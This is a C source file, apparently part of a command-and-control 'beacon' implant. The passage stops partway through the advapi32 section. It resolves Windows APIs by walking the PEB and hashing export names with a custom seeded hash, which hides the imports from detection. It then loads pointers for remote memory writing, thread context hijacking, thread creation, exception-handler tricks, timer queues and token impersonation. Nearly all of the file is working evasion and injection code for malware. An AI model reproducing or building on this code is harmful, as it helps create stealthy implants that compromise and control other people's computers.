#include "beacon_api.h"
#include <intrin.h>

/* ===== 内部辅助函数 ===== */

/* Seeded FNV-1a + rotate 混合哈希 */
static DWORD HashString(const CHAR* str, ULONG len, BOOL upper)
{
    DWORD hash = 0x811C9DC5u ^ 0x5A17B3C9u;
    ULONG i;

    if (!str || len == 0) return 0;

    for (i = 0; i < len && str[i]; i++) {
        BYTE ch = (BYTE)str[i];
        if (upper && ch >= 'a' && ch <= 'z') {
            ch = ch - 'a' + 'A';
        }
        hash ^= ch;
        hash *= 0x01000193u;
        hash = (hash >> 13) | (hash << 19);
    }

    hash ^= hash >> 16;
    hash *= 0x7FEB352Du;
    hash ^= hash >> 15;
    return hash;
}

/* 将 UTF-16 字符串转换为 ASCII（截取低字节） */
static VOID Utf16ToUtf8(const WCHAR* wide, DWORD wideLen, CHAR* out)
{
    DWORD i;
    for (i = 0; i < wideLen; i++) {
        out[i] = (CHAR)(wide[i] & 0xFF);
    }
    out[wideLen] = '\0';
}

/* 通过架构特定的寄存器读取获取当前 PEB */
static PPEB GetCurrentPeb(VOID)
{
#if defined(_M_X64)
    return (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)
    return (PPEB)__readfsdword(0x30);
#else
#error Unsupported architecture for PEB lookup
#endif
}

/* ===== 基于 PEB 的模块查找 ===== */

HMODULE GetModuleByPeb(DWORD dwModuleHash)
{
    CHAR dllName[256];
    PPEB pPEB = GetCurrentPeb();
    PPEB_LDR_DATA pLdr;
    PLIST_ENTRY pListHead;
    PLIST_ENTRY pCurrentEntry;

    if (pPEB == NULL || pPEB->Ldr == NULL) {
        return NULL;
    }

    pLdr = pPEB->Ldr;
    pListHead = &pLdr->InMemoryOrderModuleList;
    pCurrentEntry = pListHead->Flink;

    while (pCurrentEntry != pListHead) {
        PMY_LDR_DATA_TABLE_ENTRY pEntry;
        DWORD moduleHash;
        SIZE_T nameLen;

        pEntry = (PMY_LDR_DATA_TABLE_ENTRY)((BYTE*)pCurrentEntry -
            FIELD_OFFSET(MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        pCurrentEntry = pCurrentEntry->Flink;

        if (pEntry->DllBase == NULL || pEntry->BaseDllName.Buffer == NULL) {
            continue;
        }

        nameLen = pEntry->BaseDllName.Length / sizeof(WCHAR);
        if (nameLen == 0 || nameLen >= sizeof(dllName)) {
            continue;
        }

        Utf16ToUtf8(pEntry->BaseDllName.Buffer, (DWORD)nameLen, dllName);
        moduleHash = HashString(dllName, (ULONG)nameLen, TRUE);

        if (moduleHash == dwModuleHash) {
            return (HMODULE)pEntry->DllBase;
        }
    }

    return NULL;
}

/* ===== PE 导出表解析 ===== */

static FARPROC ResolveForwardedExport(PCSTR forwarder)
{
    CHAR moduleName[128];
    CHAR procName[128];
    PCSTR dot;
    SIZE_T modLen;
    SIZE_T procLen;
    HMODULE hModule;

    if (!forwarder) return NULL;

    dot = strchr(forwarder, '.');
    if (!dot || dot == forwarder || dot[1] == '\0') {
        return NULL;
    }

    modLen = (SIZE_T)(dot - forwarder);
    procLen = strlen(dot + 1);
    if (modLen >= sizeof(moduleName) - 5 || procLen >= sizeof(procName)) {
        return NULL;
    }

    memcpy(moduleName, forwarder, modLen);
    moduleName[modLen] = '\0';
    if (!strchr(moduleName, '.')) {
        memcpy(moduleName + modLen, ".dll", 5);
    }

    memcpy(procName, dot + 1, procLen + 1);

    hModule = GetModuleHandleA(moduleName);
    if (!hModule) {
        hModule = LoadLibraryA(moduleName);
    }
    if (!hModule) {
        return NULL;
    }

    if (procName[0] == '#') {
        DWORD ordinal = strtoul(procName + 1, NULL, 10);
        if (ordinal > 0xFFFF) {
            return NULL;
        }
        return GetProcAddress(hModule, (LPCSTR)(ULONG_PTR)(WORD)ordinal);
    }

    return GetProcAddress(hModule, procName);
}

/* 遍历模块导出表，按模块 hash + 函数 hash 查找 API 地址。 */
FARPROC GetApiAddressByHash(HMODULE hModule, DWORD dwModuleHash, DWORD dwFunctionHash)
{
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeaders;
    DWORD exportDirRva;
    DWORD exportDirSize;
    PIMAGE_EXPORT_DIRECTORY pExportDir;
    PDWORD pNames;
    PDWORD pFunctions;
    PWORD pOrdinals;
    DWORD i;

    if (hModule == NULL) {
        return NULL;
    }

    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    exportDirRva = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    exportDirSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (exportDirRva == 0) {
        return NULL;
    }

    pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRva);
    pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    for (i = 0; i < pExportDir->NumberOfNames; i++) {
        PCSTR pName = (PCSTR)((BYTE*)hModule + pNames[i]);
        DWORD funcHash = HashString(pName, (ULONG)strlen(pName), FALSE);

        if (dwModuleHash + funcHash == dwFunctionHash) {
            DWORD funcRva = pFunctions[pOrdinals[i]];
            if (exportDirSize &&
                funcRva >= exportDirRva &&
                funcRva < exportDirRva + exportDirSize) {
                return ResolveForwardedExport((PCSTR)((BYTE*)hModule + funcRva));
            }
            return (FARPROC)((BYTE*)hModule + funcRva);
        }
    }

    return NULL;
}

/* ===== 初始化所有 API 函数指针 ===== */

BOOL Win32ApiInit(PWin32Api pApi)
{
    HMODULE hKernel32;
    HMODULE hNtdll;
    HMODULE hAdvapi32;
    HMODULE hBcrypt;
    HMODULE hWinhttp;

    if (!pApi) return FALSE;

    memset(pApi, 0, sizeof(*pApi));

    /* 通过 PEB 解析模块句柄 */
    hKernel32 = GetModuleByPeb(H_MOD_KERNEL32_DLL_HASH);
    hNtdll = GetModuleByPeb(H_MOD_NTDLL_DLL_HASH);

    if (!hKernel32 || !hNtdll) {
        return FALSE;
    }

    /* --- kernel32.dll --- */
    pApi->pfnCreateFileA = (fnCreateFileA)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEFILEA_HASH);
    pApi->pfnCreateFileW = (fnCreateFileW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEFILEW_HASH);
    pApi->pfnReadFile = (fnReadFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_READFILE_HASH);
    pApi->pfnWriteFile = (fnWriteFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WRITEFILE_HASH);
    pApi->pfnCloseHandle = (fnCloseHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CLOSEHANDLE_HASH);
    pApi->pfnDuplicateHandle = (fnDuplicateHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DUPLICATEHANDLE_HASH);
    pApi->pfnGetFileSize = (fnGetFileSize)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETFILESIZE_HASH);
    pApi->pfnCreateProcessW = (fnCreateProcessW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEPROCESSW_HASH);
    pApi->pfnInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_INITIALIZEPROCTHREADATTRIBUTELIST_HASH);
    pApi->pfnUpdateProcThreadAttribute = (fnUpdateProcThreadAttribute)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_UPDATEPROCTHREADATTRIBUTE_HASH);
    pApi->pfnDeleteProcThreadAttributeList = (fnDeleteProcThreadAttributeList)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DELETEPROCTHREADATTRIBUTELIST_HASH);
    pApi->pfnOpenProcess = (fnOpenProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_OPENPROCESS_HASH);
    pApi->pfnTerminateProcess = (fnTerminateProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_TERMINATEPROCESS_HASH);
    pApi->pfnVirtualAlloc = (fnVirtualAlloc)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_VIRTUALALLOC_HASH);
    pApi->pfnVirtualFree = (fnVirtualFree)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_VIRTUALFREE_HASH);
    pApi->pfnVirtualProtect = (fnVirtualProtect)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_VIRTUALPROTECT_HASH);
    pApi->pfnCreateThread = (fnCreateThread)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATETHREAD_HASH);
    pApi->pfnCreateEventW = (fnCreateEventW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEEVENTW_HASH);
    pApi->pfnSetEvent = (fnSetEvent)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETEVENT_HASH);
    pApi->pfnCreateTimerQueue = (fnCreateTimerQueue)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATETIMERQUEUE_HASH);
    pApi->pfnCreateTimerQueueTimer = (fnCreateTimerQueueTimer)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATETIMERQUEUETIMER_HASH);
    pApi->pfnDeleteTimerQueueEx = (fnDeleteTimerQueueEx)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DELETETIMERQUEUEEX_HASH);
    pApi->pfnCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATETOOLHELP32SNAPSHOT_HASH);
    pApi->pfnProcess32FirstW = (fnProcess32FirstW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_PROCESS32FIRSTW_HASH);
    pApi->pfnProcess32NextW = (fnProcess32NextW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_PROCESS32NEXTW_HASH);
    pApi->pfnGetModuleFileNameW = (fnGetModuleFileNameW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETMODULEFILENAMEW_HASH);
    pApi->pfnQueryFullProcessImageNameW = (fnQueryFullProcessImageNameW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_QUERYFULLPROCESSIMAGENAMEW_HASH);
    pApi->pfnIsWow64Process = (fnIsWow64Process)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_ISWOW64PROCESS_HASH);
    pApi->pfnGetNativeSystemInfo = (fnGetNativeSystemInfo)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETNATIVESYSTEMINFO_HASH);
    pApi->pfnMoveFileExW = (fnMoveFileExW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_MOVEFILEEXW_HASH);
    pApi->pfnCopyFileW = (fnCopyFileW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_COPYFILEW_HASH);
    pApi->pfnDeleteFileW = (fnDeleteFileW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DELETEFILEW_HASH);
    pApi->pfnCreateDirectoryW = (fnCreateDirectoryW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEDIRECTORYW_HASH);
    pApi->pfnRemoveDirectoryW = (fnRemoveDirectoryW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_REMOVEDIRECTORYW_HASH);
    pApi->pfnFindFirstFileW = (fnFindFirstFileW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FINDFIRSTFILEW_HASH);
    pApi->pfnFindNextFileW = (fnFindNextFileW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FINDNEXTFILEW_HASH);
    pApi->pfnFindClose = (fnFindClose)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FINDCLOSE_HASH);
    pApi->pfnGetFileAttributesW = (fnGetFileAttributesW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETFILEATTRIBUTESW_HASH);
    pApi->pfnSetFileAttributesW = (fnSetFileAttributesW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETFILEATTRIBUTESW_HASH);
    pApi->pfnGetFileTime = (fnGetFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETFILETIME_HASH);
    pApi->pfnSetFileTime = (fnSetFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETFILETIME_HASH);
    pApi->pfnGetCurrentDirectoryW = (fnGetCurrentDirectoryW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCURRENTDIRECTORYW_HASH);
    pApi->pfnSetCurrentDirectoryW = (fnSetCurrentDirectoryW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETCURRENTDIRECTORYW_HASH);
    pApi->pfnProcessIdToSessionId = (fnProcessIdToSessionId)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_PROCESSIDTOSESSIONID_HASH);
    pApi->pfnGetTimeZoneInformation = (fnGetTimeZoneInformation)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETTIMEZONEINFORMATION_HASH);
    pApi->pfnFileTimeToLocalFileTime = (fnFileTimeToLocalFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FILETIMETOLOCALFILETIME_HASH);
    pApi->pfnFileTimeToSystemTime = (fnFileTimeToSystemTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FILETIMETOSYSTEMTIME_HASH);
    pApi->pfnSystemTimeToFileTime = (fnSystemTimeToFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SYSTEMTIMETOFILETIME_HASH);
    pApi->pfnLocalFileTimeToFileTime = (fnLocalFileTimeToFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_LOCALFILETIMETOFILETIME_HASH);
    pApi->pfnGetComputerNameW = (fnGetComputerNameW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCOMPUTERNAMEW_HASH);
    pApi->pfnGetUserNameW = (fnGetUserNameW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETUSERNAMEW_HASH);
    pApi->pfnGetSystemInfo = (fnGetSystemInfo)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETSYSTEMINFO_HASH);
    pApi->pfnSetHandleInformation = (fnSetHandleInformation)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETHANDLEINFORMATION_HASH);
    pApi->pfnCreatePipe = (fnCreatePipe)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEPIPE_HASH);
    pApi->pfnGetStdHandle = (fnGetStdHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETSTDHANDLE_HASH);
    pApi->pfnWaitForSingleObject = (fnWaitForSingleObject)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WAITFORSINGLEOBJECT_HASH);
    pApi->pfnWaitForMultipleObjects = (fnWaitForMultipleObjects)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WAITFORMULTIPLEOBJECTS_HASH);
    pApi->pfnGetExitCodeProcess = (fnGetExitCodeProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETEXITCODEPROCESS_HASH);
    pApi->pfnFlushFileBuffers = (fnFlushFileBuffers)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FLUSHFILEBUFFERS_HASH);
    pApi->pfnSetEndOfFile = (fnSetEndOfFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETENDOFFILE_HASH);
    pApi->pfnSetFilePointerEx = (fnSetFilePointerEx)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETFILEPOINTEREX_HASH);
    pApi->pfnGetFileSizeEx = (fnGetFileSizeEx)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETFILESIZEEX_HASH);
    pApi->pfnHeapAlloc = (fnHeapAlloc)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_HEAPALLOC_HASH);
    pApi->pfnHeapFree = (fnHeapFree)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_HEAPFREE_HASH);
    pApi->pfnHeapReAlloc = (fnHeapReAlloc)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_HEAPREALLOC_HASH);
    pApi->pfnGetProcessHeap = (fnGetProcessHeap)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETPROCESSHEAP_HASH);
    pApi->pfnGetCurrentProcess = (fnGetCurrentProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCURRENTPROCESS_HASH);
    pApi->pfnGetCurrentProcessId = (fnGetCurrentProcessId)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCURRENTPROCESSID_HASH);
    pApi->pfnGetCurrentThread = (fnGetCurrentThread)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCURRENTTHREAD_HASH);
    pApi->pfnGetCurrentThreadId = (fnGetCurrentThreadId)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCURRENTTHREADID_HASH);
    pApi->pfnSleep = (fnSleep)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SLEEP_HASH);
    pApi->pfnGetTickCount64 = (fnGetTickCount64)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETTICKCOUNT64_HASH);
    pApi->pfnGetSystemTimeAsFileTime = (fnGetSystemTimeAsFileTime)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETSYSTEMTIMEASFILETIME_HASH);
    pApi->pfnOutputDebugStringA = (fnOutputDebugStringA)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_OUTPUTDEBUGSTRINGA_HASH);
    pApi->pfnGetLastError = (fnGetLastError)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETLASTERROR_HASH);
    pApi->pfnSetLastError = (fnSetLastError)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETLASTERROR_HASH);
    pApi->pfnMultiByteToWideChar = (fnMultiByteToWideChar)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_MULTIBYTETOWIDECHAR_HASH);
    pApi->pfnWideCharToMultiByte = (fnWideCharToMultiByte)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WIDECHARTOMULTIBYTE_HASH);
    pApi->pfnGetACP = (fnGetACP)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETACP_HASH);
    pApi->pfnGetOEMCP = (fnGetOEMCP)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETOEMCP_HASH);
    pApi->pfnGetConsoleCP = (fnGetConsoleCP)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCONSOLECP_HASH);
    pApi->pfnGetCommandLineW = (fnGetCommandLineW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETCOMMANDLINEW_HASH);
    pApi->pfnLoadLibraryW = (fnLoadLibraryW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_LOADLIBRARYW_HASH);
    pApi->pfnLoadLibraryA = (fnLoadLibraryA)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_LOADLIBRARYA_HASH);
    pApi->pfnGetProcAddress = (fnGetProcAddress)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETPROCADDRESS_HASH);
    pApi->pfnFreeLibrary = (fnFreeLibrary)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FREELIBRARY_HASH);
    pApi->pfnGetModuleHandleW = (fnGetModuleHandleW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETMODULEHANDLEW_HASH);
    pApi->pfnGetModuleHandleA = (fnGetModuleHandleA)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETMODULEHANDLEA_HASH);

    /* --- ntdll.dll --- */
    pApi->pfnRtlGetVersion = (fnRtlGetVersion)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLGETVERSION_HASH);
    pApi->pfnNtQueryInformationProcess = (fnNtQueryInformationProcess)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTQUERYINFORMATIONPROCESS_HASH);
    pApi->pfnNtQuerySystemInformation = (fnNtQuerySystemInformation)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTQUERYSYSTEMINFORMATION_HASH);
    pApi->pfnRtlInitUnicodeString = (fnRtlInitUnicodeString)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLINITUNICODESTRING_HASH);
    pApi->pfnNtClose = (fnNtClose)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTCLOSE_HASH);
    pApi->pfnLdrLoadDll = (fnLdrLoadDll)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_LDRLOADDLL_HASH);
    pApi->pfnNtCreateThreadEx = (fnNtCreateThreadEx)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTCREATETHREADEX_HASH);
    pApi->pfnNtGetContextThread = (fnNtGetContextThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTGETCONTEXTTHREAD_HASH);
    pApi->pfnNtSetContextThread = (fnNtSetContextThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTSETCONTEXTTHREAD_HASH);
    pApi->pfnNtResumeThread = (fnNtResumeThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTRESUMETHREAD_HASH);
    pApi->pfnNtWaitForSingleObject = (fnNtWaitForSingleObject)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTWAITFORSINGLEOBJECT_HASH);
    pApi->pfnNtTerminateThread = (fnNtTerminateThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTTERMINATETHREAD_HASH);
    pApi->pfnNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTALLOCATEVIRTUALMEMORY_HASH);
    pApi->pfnNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTPROTECTVIRTUALMEMORY_HASH);
    pApi->pfnNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTWRITEVIRTUALMEMORY_HASH);
    pApi->pfnNtOpenProcess = (fnNtOpenProcess)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTOPENPROCESS_HASH);
    pApi->pfnLdrGetProcedureAddress = (fnLdrGetProcedureAddress)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_LDRGETPROCEDUREADDRESS_HASH);
    pApi->pfnRtlExitUserThread = (fnRtlExitUserThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLEXITUSERTHREAD_HASH);
    pApi->pfnRtlAddVectoredExceptionHandler = (fnRtlAddVectoredExceptionHandler)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER_HASH);
    pApi->pfnRtlRemoveVectoredExceptionHandler = (fnRtlRemoveVectoredExceptionHandler)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH);
    pApi->pfnRtlCaptureContext = (fnRtlCaptureContext)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLCAPTURECONTEXT_HASH);
    pApi->pfnNtContinue = (fnNtContinue)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTCONTINUE_HASH);
    pApi->pfnRtlCreateTimerQueue = (fnRtlCreateTimerQueue)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLCREATETIMERQUEUE_HASH);
    pApi->pfnRtlCreateTimer = (fnRtlCreateTimer)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLCREATETIMER_HASH);
    pApi->pfnRtlDeleteTimerQueue = (fnRtlDeleteTimerQueue)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLDELETETIMERQUEUE_HASH);
    pApi->pfnRtlRegisterWait = (fnRtlRegisterWait)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLREGISTERWAIT_HASH);
    pApi->pfnRtlDeregisterWait = (fnRtlDeregisterWait)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLDEREGISTERWAIT_HASH);
    pApi->ulTpReleaseCleanupGroupMembers = (ULONG_PTR)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_TPRELEASECLEANUPGROUPMEMBERS_HASH);

    /* --- advapi32.dll（若不在 PEB 中则通过 LoadLibrary 回退加载） --- */
    hAdvapi32 = GetModuleByPeb(H_MOD_ADVAPI32_DLL_HASH);
    if (!hAdvapi32 && pApi->pfnLoadLibraryW) {
        hAdvapi32 = pApi->pfnLoadLibraryW(L"advapi32.dll");
    }
    if (hAdvapi32) {
        pApi->pfnOpenProcessToken = (fnOpenProcessToken)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_OPENPROCESSTOKEN_HASH);
        pApi->pfnGetTokenInformation = (fnGetTokenInformation)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_GETTOKENINFORMATION_HASH);
        pApi->pfnDuplicateTokenEx = (fnDuplicateTokenEx)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_DUPLICATETOKENEX_HASH);
        pApi->pfnImpersonateLoggedOnUser = (fnImpersonateLoggedOnUser)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_IMPERSONATELOGGEDONUSER_HASH);
        pApi->pfnRevertToSelf = (fnRevertToSelf)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_REVERTTOSELF_HASH);
        pApi->pfnLookupAccountSidW = (fnLookupAccountSidW)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_LOOKUPACCOUNTSIDW_HASH);
        pApi->pfnRegOpenKeyExW = (fnRegOpenKeyExW)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_REGOPENKEYEXW_HASH);
